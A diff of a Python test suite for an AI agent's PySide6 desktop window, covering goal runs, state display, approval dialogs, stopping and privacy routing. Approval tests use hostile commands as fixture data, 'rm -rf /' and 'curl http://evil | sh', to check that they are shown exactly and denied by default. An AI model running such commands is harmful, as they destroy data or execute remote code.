@@ -8,10 +8,11 @@ os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
 try:
     from PySide6.QtCore import Qt, QTimer
     from PySide6.QtTest import QTest
-    from PySide6.QtWidgets import QApplication, QFrame, QLabel, QPlainTextEdit, QPushButton
+    from PySide6.QtWidgets import QApplication, QLineEdit, QMenuBar, QPlainTextEdit, QPushButton, QToolBar
     from praxis.desktop.qt import theme
-    from praxis.desktop.qt.app import MainWindow, STRATEGY
-    from praxis.desktop.qt.dialogs import ApprovalDialog, KeyDialog
+    from praxis.desktop.qt.app import MainWindow, STRATEGY, apply_view
+    from praxis.desktop.qt.core import CoreView
+    from praxis.desktop.qt.dialogs import ApprovalDialog
     HAVE_QT = True
 except Exception:  # PySide6 missing (or no usable platform plugin)
     HAVE_QT = False
@@ -85,8 +86,9 @@ class Autopilot:
             self.action(w)
 
 
+
 @unittest.skipUnless(HAVE_QT, "PySide6 not available")
-class QtUI(unittest.TestCase):
+class OneScreen(unittest.TestCase):
     @classmethod
     def setUpClass(cls):
         cls.app = qapp()
@@ -96,72 +98,94 @@ class QtUI(unittest.TestCase):
         st = stack or fake_stack(responses or [GOOD], agents, hook)
         ctl = Controller(ws, stack_factory=factory or (lambda w: st), home=home, approval_timeout=approval_timeout)
         ctl.start()
-        win = MainWindow(ctl, FakeTelemetry())
+        win = MainWindow(ctl)
         win.show()
         self.addCleanup(lambda: (ctl.stop(), setattr(win, "_closing", True), win.timer.stop(), win.close()))
         self.assertTrue(pump(lambda: ctl.state == "idle"), ctl.error)
         return win, ctl, ws
 
     def goal(self, win, text):
-        win.mission.objective.setPlainText(text)
-        win.run_goal()
+        win.prompt.setText(text)
+        win.prompt.returnPressed.emit()
 
     def verified(self, win):
-        return lambda: win.mission.core.title == "VERIFIED"
+        return lambda: win.core.title == "VERIFIED"
 
-    # ---- basics --------------------------------------------------------------------------------
-    def test_window_comes_up_ready_with_live_telemetry(self):
+    def rich_stack(self, **kw):
+        ps = [prov("ollama/qwen", "local", "local"), prov("groq/gpt-oss", "cloud", "free"), prov("gemini/flash", "open", "free"),
+              prov("claude/sonnet", "cloud", "fast"), prov("claude/opus", "cloud", "balanced"), prov("claude/fable", "cloud", "best")]
+        return multi_stack(ps, skipped={"cerebras": "no API key", "devin": "no DEVIN_API_KEY"}, **kw)
+
+    # ---- it really is just the core -------------------------------------------------------------------------------
+    def test_the_window_is_the_core_and_one_prompt_line_and_nothing_else(self):
         win, ctl, ws = self.make()
-        self.assertTrue(pump(lambda: win.pill.text() == "READY"))
-        self.assertIn("Ready", win.status.text())
-        self.assertFalse(win.stop_btn.isEnabled())                                   # nothing to stop yet
-        self.assertTrue(pump(lambda: "12.4" in win.bars["RAM"].text, 6))             # telemetry reached the gauge
-        self.assertIn("61%", win.bars["GPU"].text); self.assertIn("5.2", win.bars["VRAM"].text)
-        self.assertEqual(os.path.basename(ws), win.ws_name.text())
-        self.assertEqual(win.sandbox_badge.text(), "NO SANDBOX")                     # the stack has no sandbox: say so plainly
+        self.assertEqual(win.menuBar().actions(), [])                                  # no menu
+        self.assertEqual(win.findChildren(QToolBar), []); self.assertEqual(win.findChildren(QPushButton), [])   # no toolbars, no buttons
+        self.assertEqual(len(win.findChildren(CoreView)), 1); self.assertEqual(len(win.findChildren(QLineEdit)), 1)
+        self.assertTrue(win.core.isVisible() and win.prompt.isVisible())
+        self.assertGreater(win.core.height(), win.height() * 0.7)                      # the core owns the window
 
-    def test_run_a_goal_end_to_end_and_the_screen_tells_the_truth(self):
+    def test_comes_up_ready_with_the_live_settings_on_the_core(self):
+        win, ctl, ws = self.make(stack=self.rich_stack(strategy="frugal"))
+        self.assertTrue(pump(lambda: win.core.title == "READY" and "ROUTING FRUGAL" in win.core.footer))
+        self.assertIn("DATA PROJECT", win.core.footer); self.assertIn("6 MODELS", win.core.footer)
+        self.assertIn("Ready", win.core.caption); self.assertEqual(os.path.basename(ws), os.path.basename(ws))
+        self.assertIn(os.path.basename(ws), win.windowTitle())
+
+    # ---- running a goal ------------------------------------------------------------------------------------------------
+    def test_typing_an_outcome_and_pressing_enter_runs_it_and_the_core_tells_the_truth(self):
         win, ctl, ws = self.make()
         self.goal(win, "make a.txt")
+        self.assertEqual(win.prompt.text(), "")                                         # cleared
         self.assertTrue(pump(self.verified(win)))
         self.assertTrue(os.path.exists(os.path.join(ws, "a.txt")))
-        self.assertEqual([s.id for s in win.mission.graph.steps], ["s1"])
-        self.assertEqual(win.mission.graph.steps[0].state, "verified")
-        rows = [win.mission.evidence.topLevelItem(i) for i in range(win.mission.evidence.topLevelItemCount())]
-        self.assertTrue(rows and all(r.text(0) == "✓" for r in rows))
-        feed = win.mission.activity.toPlainText()
-        for needle in ("Plan accepted", "PASS", "Guard: ALLOW", "Asking scripted"):
-            self.assertIn(needle, feed)
-        self.assertGreater(win.timeline.tree.topLevelItemCount(), 5)
-        self.assertTrue(pump(lambda: win.pill.text() == "READY"))
-        self.assertTrue(win.mission.run_btn.isEnabled())                              # ready for the next goal
-        self.assertEqual(win.mission.core.progress, 1.0)
-        core = win.mission.core                                                       # and the three rings carry the real result:
-        self.assertEqual(core.ring_states(0), ["ran"])                                # PLAN: accepted
-        self.assertEqual(core.ring_states(1), ["verified"])                           # ACT: the one real step, verified
-        self.assertTrue(core.pipeline["sealed"]); self.assertEqual(core.ring_states(2), ["verified"])   # VERIFY: sealed shut
-        self.assertEqual(core.legend()[1], ("ACT", "1/1", "ok")); self.assertEqual(core.legend()[2], ("VERIFY", "sealed", "ok"))
+        core = win.core
+        self.assertEqual(core.ring_states(0), ["ran"]); self.assertEqual(core.ring_states(1), ["verified"])
+        self.assertTrue(core.pipeline["sealed"]); self.assertEqual(core.legend()[2], ("VERIFY", "sealed", "ok"))
+        self.assertEqual(core.progress, 1.0)
+        self.assertTrue(pump(lambda: win.prompt.isEnabled() and ctl.state == "idle"))
 
-    def test_goal_started_before_the_first_tick_still_streams_its_events(self):
-        """Regression: the history snapshot must not swallow the first goal's events (Tk had this race)."""
+    def test_an_empty_prompt_is_refused_politely(self):
+        win, ctl, ws = self.make()
+        self.goal(win, "   ")
+        self.assertIn("Type the outcome", win.core.caption); self.assertEqual(ctl.state, "idle")
+
+    def test_every_real_event_pulses_the_core_exactly_once_and_the_last_one_is_the_caption(self):
+        win, ctl, ws = self.make()
+        pulses = []
+        orig = win.core.pulse
+        win.core.pulse = lambda level="info": (pulses.append(level), orig(level))[1]
+        self.goal(win, "make a.txt")
+        self.assertTrue(pump(self.verified(win)))
+        pump(lambda: False, 0.4)
+        events = ctl.all_events()
+        self.assertEqual(len(pulses), len(events))                                       # none missed, none doubled
+        from praxis.desktop.view import summarize
+        self.assertEqual(win.core.caption, summarize(events[-1])[0])
+        self.assertEqual(win.core.cap_level, "ok"); self.assertIn("ok", pulses)
+
+    def test_a_goal_started_before_the_first_tick_still_streams_its_events(self):
+        """Regression: the history snapshot must not swallow the first goal's events."""
         ws, home = tempfile.mkdtemp(), tempfile.mkdtemp()
         ctl = Controller(ws, stack_factory=lambda w: fake_stack([GOOD]), home=home); ctl.start()
-        win = MainWindow(ctl, FakeTelemetry()); win.show()
+        win = MainWindow(ctl); win.show()
         self.addCleanup(lambda: (setattr(win, "_closing", True), win.timer.stop(), win.close()))
         end = time.time() + 5
         while ctl.state != "idle" and time.time() < end:      # wait WITHOUT letting the UI tick even once
             time.sleep(0.01)
-        self.assertTrue(ctl.submit("make a.txt"))             # a goal begins before any _on_ready ran
+        self.assertTrue(ctl.submit("make a.txt"))
         self.assertTrue(pump(self.verified(win)))
-        feed = win.mission.activity.toPlainText()
-        self.assertIn("Plan accepted", feed); self.assertIn("PASS", feed)
+        self.assertIn("VERIFIED", win.core.caption)
 
-    def test_goal_still_running_at_the_first_tick_streams_each_event_exactly_once(self):
+    def test_a_goal_still_running_at_the_first_tick_streams_each_event_exactly_once(self):
         gate = threading.Event()
         ws, home = tempfile.mkdtemp(), tempfile.mkdtemp()
         ctl = Controller(ws, stack_factory=lambda w: fake_stack([GOOD], hook=lambda: gate.wait(10)), home=home); ctl.start()
-        win = MainWindow(ctl, FakeTelemetry()); win.show()
+        win = MainWindow(ctl); win.show()
         self.addCleanup(lambda: (gate.set(), setattr(win, "_closing", True), win.timer.stop(), win.close()))
+        pulses = []
+        orig = win.core.pulse
+        win.core.pulse = lambda level="info": (pulses.append(level), orig(level))[1]
         end = time.time() + 5
         while ctl.state != "idle" and time.time() < end:
             time.sleep(0.01)
@@ -170,34 +194,11 @@ class QtUI(unittest.TestCase):
         gate.set()
         self.assertTrue(pump(self.verified(win)))
         pump(lambda: False, 0.4)
-        feed = win.mission.activity.toPlainText()
-        self.assertEqual(feed.count("Goal: make a.txt"), 1); self.assertEqual(feed.count("Plan accepted"), 1)
+        self.assertEqual(len(pulses), len(ctl.all_events()))
 
-    def test_timeline_add_is_idempotent(self):
-        win, ctl, ws = self.make(); self.goal(win, "x")
-        pump(self.verified(win))
-        events, n = ctl.all_events(), win.timeline.tree.topLevelItemCount()
-        win.timeline.add(events)
-        self.assertEqual(win.timeline.tree.topLevelItemCount(), n)
-
-    def test_empty_objective_is_refused_politely(self):
-        win, ctl, ws = self.make()
-        win.mission.objective.setPlainText("   "); win.run_goal()
-        self.assertIn("Type the outcome", win.status.text()); self.assertEqual(ctl.state, "idle")
-
-    def test_timeline_why_and_integrity(self):
-        win, ctl, ws = self.make(); self.goal(win, "make a.txt")
-        pump(self.verified(win)); pump(lambda: win.timeline.tree.topLevelItemCount() > 5)
-        win.timeline.verify()
-        self.assertIn("intact", win.timeline.integrity.text())
-        win.timeline.tree.setCurrentItem(win.timeline.tree.topLevelItem(win.timeline.tree.topLevelItemCount() - 1))
-        win.timeline.why()
-        self.assertIn("WHY", win.timeline.detail.toPlainText())
-
-    # ---- the core tells the truth about state ---------------------------------------------------------
-    def test_core_state_mapping(self):
-        win, ctl, ws = self.make()
-        m = win.mission
+    # ---- the core maps the real state ---------------------------------------------------------------------------------------
+    def test_state_mapping(self):
+        core = CoreView(); core.timer.stop(); self.addCleanup(core.close)
         steps = [StepView("s1", "fs.write", "w", 2, "verified"), StepView("s2", "shell.run", "r", 2, "running", ["s1"])]
         cases = [
             (View(status="RUNNING", steps=steps, goal_text="g"), "working", False, "working", "RUNNING", 0.5),
@@ -211,112 +212,86 @@ class QtUI(unittest.TestCase):
             (View(), "idle", False, "idle", "READY", 0.0),
         ]
         for view, state, waiting, mode, title, prog in cases:
-            m.show_view(view, state, waiting, [])
-            self.assertEqual((m.core.mode, m.core.title, m.core.progress), (mode, title, prog), (view.status, state))
-        m.show_view(View(status="RUNNING", steps=steps, active_provider="groq/gpt-oss"), "working", False, [])
-        self.assertEqual(m.core.active, "groq/gpt-oss")
+            apply_view(core, view, state, waiting)
+            self.assertEqual((core.mode, core.title, core.progress), (mode, title, prog), (view.status, state))
+        apply_view(core, View(status="RUNNING", steps=steps, active_provider="groq/gpt-oss"), "working", False)
+        self.assertEqual(core.active, "groq/gpt-oss")
 
     def test_the_view_maps_onto_the_three_rings(self):
-        win, ctl, ws = self.make()
-        m = win.mission
+        core = CoreView(); core.timer.stop(); self.addCleanup(core.close)
         steps = [StepView("s1", "fs.write", "w", 2, "verified"), StepView("s2", "shell.run", "r", 2, "running", ["s1"]),
                  StepView("s3", "fs.write", "x", 2, "pending", ["s2"])]
+        sts = ["verified", "running", "pending"]
         cases = [
             (View(), ("none", [], [], False)),
             (View(status="PLANNING", goal_text="g"), ("planning", [], [], False)),
-            (View(status="RUNNING", steps=steps), ("ready", ["verified", "running", "pending"], [], False)),
-            (View(status="RUNNING", steps=steps, evidence=[{"passed": True, "claim": "a"}, {"passed": False, "claim": "b"}]),
-             ("ready", ["verified", "running", "pending"], [True, False], False)),
-            (View(status="VERIFIED", steps=steps, evidence=[{"passed": True, "claim": "a"}]), ("ready", ["verified", "running", "pending"], [True], True)),
-            (View(status="VERIFIED", steps=steps), ("ready", ["verified", "running", "pending"], [], False)),     # no evidence: never "sealed"
+            (View(status="RUNNING", steps=steps), ("ready", sts, [], False)),
+            (View(status="RUNNING", steps=steps, evidence=[{"passed": True, "claim": "a"}, {"passed": False, "claim": "b"}]), ("ready", sts, [True, False], False)),
+            (View(status="VERIFIED", steps=steps, evidence=[{"passed": True, "claim": "a"}]), ("ready", sts, [True], True)),
+            (View(status="VERIFIED", steps=steps), ("ready", sts, [], False)),                     # no evidence: never "sealed"
             (View(status="FAILED", reason="planning failed: no model", goal_text="g"), ("failed", [], [], False)),
-            (View(status="FAILED", reason="step s2 failed", steps=steps), ("ready", ["verified", "running", "pending"], [], False)),
-            (View(status="FAILED", reason="workspace is too large to checkpoint", goal_text="g"), ("none", [], [], False)),   # never planned: PLAN is not "rejected"
+            (View(status="FAILED", reason="step s2 failed", steps=steps), ("ready", sts, [], False)),
+            (View(status="FAILED", reason="workspace is too large to checkpoint", goal_text="g"), ("none", [], [], False)),   # never planned
         ]
         for view, (plan, st, ck, sealed) in cases:
-            m.show_view(view, "idle", False, [])
-            self.assertEqual((m.core.pipeline["plan"], m.core.pipeline["steps"], m.core.pipeline["checks"], m.core.pipeline["sealed"]),
+            apply_view(core, view, "idle", False)
+            self.assertEqual((core.pipeline["plan"], core.pipeline["steps"], core.pipeline["checks"], core.pipeline["sealed"]),
                              (plan, st, ck, sealed), (view.status, view.reason))
 
-    def test_core_lights_the_provider_that_is_being_called_right_now(self):
+    def test_the_core_lights_the_provider_in_flight_and_the_plan_ring_circles_while_planning(self):
         gate = threading.Event()
         win, ctl, ws = self.make(hook=lambda: gate.wait(10))
         self.addCleanup(gate.set)
         self.goal(win, "make a.txt")
-        self.assertTrue(pump(lambda: win.mission.core.active == "scripted", 5))      # blocked INSIDE the model call
-        self.assertEqual(win.mission.core.title, "PLANNING")
-        self.assertEqual(win.mission.core.pipeline["plan"], "planning")              # the PLAN ring is circling
-        self.assertEqual(win.mission.core.legend()[0], ("PLAN", "analysing", "accent"))
+        self.assertTrue(pump(lambda: win.core.active == "scripted", 5))                 # blocked INSIDE the model call
+        self.assertEqual(win.core.title, "PLANNING"); self.assertEqual(win.core.pipeline["plan"], "planning")
         gate.set()
         self.assertTrue(pump(self.verified(win)))
-        self.assertEqual(win.mission.core.active, "")                                 # the beam goes out when the call returns
+        self.assertEqual(win.core.active, "")
 
-    def test_setup_needed_is_explained_when_no_model_exists(self):
+    def test_no_models_explains_what_to_do_on_the_core(self):
         win, ctl, ws = self.make(stack=multi_stack([], skipped={"claude": "not installed"}))
         self.assertTrue(pump(lambda: win._loaded_ws == ctl.workspace))
-        self.assertIn("No AI models", win.mission.hint)
-        self.assertIn("claude", win.mission.hint)                                    # what was looked for and not found
-        self.assertTrue(pump(lambda: win.mission.core.title == "SETUP NEEDED", 3))
-        self.assertIn("Fuel", win.mission.core.subtitle)                              # and where to fix it
-        self.assertIn("None found", win.status.text())
-
-    def test_the_core_types_out_the_latest_real_event_and_shows_the_live_settings(self):
-        win, ctl, ws = self.make(stack=self.rich_stack(strategy="frugal"))
-        core = win.mission.core
-        self.assertTrue(pump(lambda: "ROUTING FRUGAL" in core.footer))
-        self.assertIn("DATA PROJECT", core.footer); self.assertIn("6 MODELS", core.footer)
-        win.data_seg.changed.emit("private"); win.frugal_seg.changed.emit("quality")
-        self.assertTrue(pump(lambda: "DATA PRIVATE" in core.footer and "ROUTING QUALITY" in core.footer))   # follows the switches
-        win.data_seg.changed.emit("project")
-        self.goal(win, "make a.txt")
-        self.assertEqual(core.caption, "Goal accepted. Planning...")                      # said the instant the goal was accepted
-        self.assertTrue(pump(self.verified(win), 10))                                    # (finish it: closing mid-goal asks a question)
-
-    def test_every_real_event_ripples_the_sphere_and_the_last_one_is_the_caption(self):
-        win, ctl, ws = self.make()
-        pulses = []
-        orig = win.mission.core.pulse
-        win.mission.core.pulse = lambda level="info": (pulses.append(level), orig(level))[1]
-        self.goal(win, "make a.txt")
-        self.assertTrue(pump(self.verified(win)))
-        pump(lambda: False, 0.3)
-        lines = [l for l in win.mission.activity.toPlainText().splitlines() if l.strip()]
-        self.assertEqual(len(pulses), len(lines))                                         # one ripple per real event
-        self.assertIn("ok", pulses)                                                       # PASS / VERIFIED are 'ok' ripples
-        self.assertEqual(win.mission.core.caption, lines[-1].split("  ", 1)[1])           # the caption IS the last event
-        self.assertEqual(win.mission.core.cap_level, "ok")
+        self.assertIn("No AI models", win.hint); self.assertIn("keys set", win.hint)
+        self.assertTrue(pump(lambda: win.core.title == "SETUP NEEDED", 3))
+        self.assertIn("keys set", win.core.caption)
 
     def test_boot_and_error_states_are_explained_on_the_core(self):
         gate = threading.Event()
         ws, home = tempfile.mkdtemp(), tempfile.mkdtemp()
         ctl = Controller(ws, stack_factory=lambda w: (gate.wait(10), fake_stack([GOOD]))[1], home=home); ctl.start()
-        win = MainWindow(ctl, FakeTelemetry()); win.show()
+        win = MainWindow(ctl); win.show()
         self.addCleanup(lambda: (gate.set(), setattr(win, "_closing", True), win.timer.stop(), win.close()))
-        core = win.mission.core
-        self.assertTrue(pump(lambda: "Booting" in core.caption, 3))             # (the widget is BORN titled STARTING: wait for the caption)
-        self.assertEqual(core.title, "STARTING"); self.assertEqual(core.footer, ""); self.assertEqual(core.field.dyn.mode, "starting")
+        self.assertTrue(pump(lambda: "Booting" in win.core.caption, 3))
+        self.assertEqual(win.core.footer, ""); self.assertFalse(win.prompt.isEnabled())
         gate.set()
-        self.assertTrue(pump(lambda: core.title == "READY", 5)); self.assertIn("ROUTING", core.footer)
+        self.assertTrue(pump(lambda: win.core.title == "READY", 5)); self.assertTrue(win.prompt.isEnabled())
         def boom(w): raise RuntimeError("no providers configured")
         ctl2 = Controller(tempfile.mkdtemp(), stack_factory=boom, home=tempfile.mkdtemp()); ctl2.start()
-        win2 = MainWindow(ctl2, FakeTelemetry()); win2.show()
+        win2 = MainWindow(ctl2); win2.show()
         self.addCleanup(lambda: (setattr(win2, "_closing", True), win2.timer.stop(), win2.close()))
-        self.assertTrue(pump(lambda: win2.mission.core.title == "ERROR", 5))
-        self.assertIn("no providers configured", win2.mission.core.caption); self.assertEqual(win2.mission.core.cap_level, "bad")
-        self.assertEqual(win2.mission.core.field.dyn.mode, "bad")
+        self.assertTrue(pump(lambda: win2.core.title == "ERROR", 5))
+        self.assertIn("no providers configured", win2.core.caption); self.assertEqual(win2.core.cap_level, "bad")
 
-    # ---- approvals ---------------------------------------------------------------------------------------
+    # ---- approvals ----------------------------------------------------------------------------------------------------------
     def test_approval_dialog_shows_exact_action_defaults_to_deny_and_deny_blocks(self):
         win, ctl, ws = self.make(responses=[tdc.Approvals.PLAN], agents={"claude": FakeAgent()})
         pilot = Autopilot(lambda d: d.deny_btn.click())
         self.goal(win, "delegate it")
         self.assertTrue(pump(lambda: len(pilot.seen) == 1 and ctl.state == "idle"))
         seen = pilot.seen[0]
-        self.assertIn("make made.txt", seen["text"]); self.assertIn("agent.delegate".split(".")[0], "agent")
-        self.assertEqual(seen["cls"], 3)
+        self.assertIn("make made.txt", seen["text"]); self.assertEqual(seen["cls"], 3)
         self.assertTrue(seen["deny_default"]); self.assertTrue(seen["deny_focused"]); self.assertFalse(seen["ok_default"])
-        self.assertFalse(os.path.exists(os.path.join(ws, "made.txt")))              # denied: nothing happened
+        self.assertFalse(os.path.exists(os.path.join(ws, "made.txt")))
         self.assertEqual(ctl.poll().view.status, "FAILED")
+
+    def test_the_core_asks_for_you_while_an_approval_is_pending(self):
+        win, ctl, ws = self.make(responses=[tdc.Approvals.PLAN], agents={"claude": FakeAgent()})
+        seen = []
+        pilot = Autopilot(lambda d: (seen.append((win.core.title, win.core.mode)), d.deny_btn.click()))
+        self.goal(win, "delegate it")
+        self.assertTrue(pump(lambda: len(pilot.seen) == 1 and ctl.state == "idle"))
+        self.assertEqual(seen, [("NEEDS YOU", "waiting")])
 
     def test_escape_and_window_close_are_refusals(self):
         win, ctl, ws = self.make(responses=[tdc.Approvals.PLAN], agents={"claude": FakeAgent()})
@@ -324,8 +299,7 @@ class QtUI(unittest.TestCase):
         self.goal(win, "delegate it")
         self.assertTrue(pump(lambda: len(pilot.seen) == 1 and ctl.state == "idle"))
         self.assertFalse(os.path.exists(os.path.join(ws, "made.txt")))
-        d = ApprovalDialog(win, ApprovalRequest("x", "shell.run", 4, {"cmd": "rm -rf /"}, "r"))
-        d.reject()
+        d = ApprovalDialog(win, ApprovalRequest("x", "shell.run", 4, {"cmd": "rm -rf /"}, "r")); d.reject()
         self.assertFalse(d.answer)
 
     def test_approve_runs_the_action(self):
@@ -333,26 +307,9 @@ class QtUI(unittest.TestCase):
         pilot = Autopilot(lambda d: d.ok_btn.click())
         self.goal(win, "delegate it")
         self.assertTrue(pump(self.verified(win)))
-        self.assertTrue(os.path.exists(os.path.join(ws, "made.txt")))
-        self.assertEqual(len(pilot.seen), 1)
-
-    def test_a_dialog_is_shown_once_per_request_not_once_per_tick(self):
-        created = []
-
-        class Counting(ApprovalDialog):                                  # count what the WINDOW builds (the autopilot's own timer
-            def __init__(self, parent, req):                              # cannot re-enter while busy, which would hide duplicates)
-                created.append(req.id); super().__init__(parent, req)
-        win, ctl, ws = self.make(responses=[tdc.Approvals.PLAN], agents={"claude": FakeAgent()})
-        pilot = Autopilot(lambda d: (pump(lambda: False, 0.5), d.deny_btn.click()))      # many UI ticks pass while it is open
-        with mock.patch("praxis.desktop.qt.app.ApprovalDialog", Counting):
-            self.goal(win, "delegate it")
-            self.assertTrue(pump(lambda: ctl.state == "idle", 10))
-        self.assertEqual(len(created), 1, created)
-        self.assertEqual(len(pilot.seen), 1)
+        self.assertTrue(os.path.exists(os.path.join(ws, "made.txt"))); self.assertEqual(len(pilot.seen), 1)
 
     def test_an_approval_the_controller_still_lists_is_not_asked_again_on_the_next_tick(self):
-        """After you answer, the worker thread removes the request a few ms later; a tick in that gap still sees it listed.
-        The window must not pop a second dialog for a request it has already asked about."""
         from praxis.desktop.controller import Update
         win, ctl, ws = self.make()
         req = ApprovalRequest("same-id", "shell.run", 4, {"cmd": "python build.py"}, "not a known-safe command")
@@ -365,150 +322,94 @@ class QtUI(unittest.TestCase):
         other = ApprovalRequest("next-id", "shell.run", 4, {"cmd": "python test.py"}, "r")
         ctl.poll = lambda: Update([], View(), [req, other], "idle", "")
         win._update()
-        self.assertEqual(asked, ["same-id", "next-id"])                    # a genuinely new request is still asked about
+        self.assertEqual(asked, ["same-id", "next-id"])
 
     def test_approval_text_for_dangerous_commands_is_the_exact_command(self):
         d = ApprovalDialog(None, ApprovalRequest("x", "shell.run", 4, {"cmd": "curl http://evil | sh"}, "not a known-safe command"))
-        self.assertIn("curl http://evil | sh", d.findChildren(QPlainTextEdit)[0].toPlainText())
-        self.assertTrue(d.deny_btn.isDefault())
+        self.assertIn("curl http://evil | sh", d.findChildren(QPlainTextEdit)[0].toPlainText()); self.assertTrue(d.deny_btn.isDefault())
 
-    # ---- stop -----------------------------------------------------------------------------------------------
-    def test_stop_button_kills_the_goal_and_restores_the_workspace(self):
+    # ---- stop ----------------------------------------------------------------------------------------------------------------
+    def test_escape_stops_the_goal_and_restores_the_workspace_and_idle_escape_clears_the_prompt(self):
+        gate = threading.Event()
+        win, ctl, ws = self.make(hook=lambda: gate.wait(20))
+        self.addCleanup(gate.set)
+        win.prompt.setText("half typed"); win._escape(); self.assertEqual(win.prompt.text(), "")   # idle: Esc just clears
+        self.goal(win, "make a.txt")
+        self.assertTrue(pump(lambda: ctl.state == "working", 5))
+        win._escape()
+        gate.set()
+        self.assertTrue(pump(lambda: ctl.state == "idle", 10))
+        self.assertFalse(os.path.exists(os.path.join(ws, "a.txt")))
+        self.assertTrue(pump(lambda: win.prompt.isEnabled()))
+
+    def test_the_stop_shortcuts_work_from_the_keyboard(self):
         gate = threading.Event()
         win, ctl, ws = self.make(hook=lambda: gate.wait(20))
         self.addCleanup(gate.set)
         self.goal(win, "make a.txt")
-        self.assertTrue(pump(lambda: win.stop_btn.isEnabled(), 5))
-        win.stop_btn.click()
+        self.assertTrue(pump(lambda: ctl.state == "working", 5))
+        win.activateWindow(); win.raise_(); pump(win.isActiveWindow, 3)              # a shortcut only fires in the active window
+        QTest.keyClick(win, Qt.Key_Period, Qt.ControlModifier)
+        self.assertTrue(pump(lambda: ctl.state == "stopping", 5))                    # the key itself registered (not a race with the goal)
         gate.set()
-        self.assertTrue(pump(lambda: ctl.state == "idle", 10))
-        self.assertFalse(os.path.exists(os.path.join(ws, "a.txt")))
-        self.assertTrue(pump(lambda: win.pill.text() == "READY"))
-        self.assertFalse(win.stop_btn.isEnabled())
+        self.assertTrue(pump(lambda: ctl.state == "idle", 10)); self.assertFalse(os.path.exists(os.path.join(ws, "a.txt")))
 
-    # ---- fuel, failover, privacy, frugality ------------------------------------------------------------
-    def rich_stack(self, **kw):
-        ps = [prov("ollama/qwen", "local", "local"), prov("groq/gpt-oss", "cloud", "free"), prov("gemini/flash", "open", "free"),
-              prov("claude/sonnet", "cloud", "fast"), prov("claude/opus", "cloud", "balanced"), prov("claude/fable", "cloud", "best")]
-        return multi_stack(ps, skipped={"cerebras": "no API key (free: https://cloud.cerebras.ai)", "mistral": "no API key (free: x)",
-                                        "devin": "no DEVIN_API_KEY"}, **kw)
-
-    def test_fuel_page_shows_the_failover_ladder_in_frugal_order_and_offers_keys(self):
-        win, ctl, ws = self.make(stack=self.rich_stack())
-        win.show_page("Fuel")
-        ladder = win.fuel.ladder_text.text()
-        order = [ladder.index(n) for n in ("qwen", "gpt-oss", "sonnet", "opus", "fable")]
-        self.assertEqual(order, sorted(order))                       # local -> free -> Claude small to large
-        self.assertNotIn("flash", ladder)                              # gemini may train on prompts: not at PROJECT
-        add = [b for b in win.fuel.host.findChildren(QPushButton) if b.text() == "Add key..."]
-        self.assertEqual(len(add), 2)                                   # cerebras + mistral; devin has no key flow here
-        self.assertIn("BLOCKED BY DATA CLASS", " ".join(l.text() for l in win.fuel.host.findChildren(type(win.pill))))
-
-    def test_data_class_control_gates_providers_end_to_end(self):
+    # ---- data class and frugality, from the keyboard ---------------------------------------------------------------------------
+    def test_f2_cycles_the_data_class_and_the_footer_follows_and_private_keeps_the_cloud_out(self):
         cloud = prov("groq/gpt-oss", "cloud", "free")
         win, ctl, ws = self.make(stack=multi_stack([cloud]))
-        self.assertEqual(win.data_seg.current, "project")
-        win.data_seg.set_current("private"); win.data_seg.changed.emit("private")   # what a click does
+        self.assertTrue(pump(lambda: "DATA PROJECT" in win.core.footer))
+        win.cycle_data()
         self.assertEqual(ctl.effective_data_class(), "private")
+        self.assertTrue(pump(lambda: "DATA PRIVATE" in win.core.footer))
         self.goal(win, "make a.txt")
-        self.assertTrue(pump(lambda: ctl.state == "idle" and win.mission.core.title == "FAILED", 10))
-        self.assertEqual(cloud.calls, [])                              # PRIVATE: the cloud model never saw the goal
-        win.data_seg.set_current("project"); win.data_seg.changed.emit("project")
+        self.assertTrue(pump(lambda: ctl.state == "idle" and win.core.title == "FAILED", 10))
+        self.assertEqual(cloud.calls, [])                                               # PRIVATE: the cloud model never saw the goal
+        win.cycle_data(); win.cycle_data()                                              # private -> open -> project
+        self.assertEqual(ctl.effective_data_class(), "project")
         self.goal(win, "make a.txt")
-        self.assertTrue(pump(self.verified(win), 10))
-        self.assertGreater(len(cloud.calls), 0)
+        self.assertTrue(pump(self.verified(win), 10)); self.assertGreater(len(cloud.calls), 0)
 
-    def test_frugality_control_drives_the_router_and_mirrors_it(self):
+    def test_the_keys_are_wired(self):
+        win, ctl, ws = self.make()
+        win.activateWindow(); win.raise_(); pump(win.isActiveWindow, 3)
+        QTest.keyClick(win, Qt.Key_F2)
+        self.assertTrue(pump(lambda: ctl.effective_data_class() == "private", 3))
+        QTest.keyClick(win, Qt.Key_F3)
+        self.assertTrue(pump(lambda: ctl.frugality == "frugal", 3))
+
+    def test_f3_cycles_frugality_through_the_real_router_strategies_and_frugal_never_touches_claude(self):
         st = self.rich_stack(strategy="auto")
         win, ctl, ws = self.make(stack=st)
-        self.assertEqual(win.frugal_seg.current, "balanced")           # shows what the router is actually doing
-        for key, strategy in (("quality", "measured"), ("frugal", "frugal"), ("balanced", "auto")):   # literal: STRATEGY must not grade itself
-            win.frugal_seg.changed.emit(key)
-            self.assertEqual(st.router.strategy, strategy)
+        got = []
+        for _ in range(3):
+            win.cycle_frugality(); got.append(st.router.strategy)
+        self.assertEqual(got, ["frugal", "measured", "auto"])                            # balanced -> frugal -> quality -> balanced
         self.assertEqual(STRATEGY, {"quality": "measured", "balanced": "auto", "frugal": "frugal"})
-        win.frugal_seg.changed.emit("frugal")
-        self.assertEqual([p.card.name for p in st.router.eligible("planner", "project")][0], "ollama/qwen")
-
-    def test_the_header_switches_show_what_the_loaded_stack_will_really_do(self):
-        st = self.rich_stack(strategy="frugal"); st.cfg["privacy"]["data_class"] = "private"
-        win, ctl, ws = self.make(stack=st)
-        self.assertTrue(pump(lambda: win._loaded_ws == ctl.workspace))
-        self.assertEqual(win.frugal_seg.current, "frugal"); self.assertEqual(win.data_seg.current, "private")
-
-    def test_a_card_with_the_same_privacy_and_cost_word_shows_it_once(self):
-        win, ctl, ws = self.make(stack=self.rich_stack())
-        win.show_page("Fuel")
-        ollama = [f for f in win.fuel.host.findChildren(QFrame) if any(l.text() == "ollama" for l in f.findChildren(QLabel))][0]
-        self.assertEqual([l.text() for l in ollama.findChildren(QLabel)].count("LOCAL"), 1)       # not "LOCAL  LOCAL"
-
-    def test_a_goal_in_frugal_mode_uses_the_local_model_not_claude(self):
-        st = self.rich_stack(strategy="frugal")
-        win, ctl, ws = self.make(stack=st)
+        win.cycle_frugality()
+        self.assertTrue(pump(lambda: "ROUTING FRUGAL" in win.core.footer))
         self.goal(win, "make a.txt")
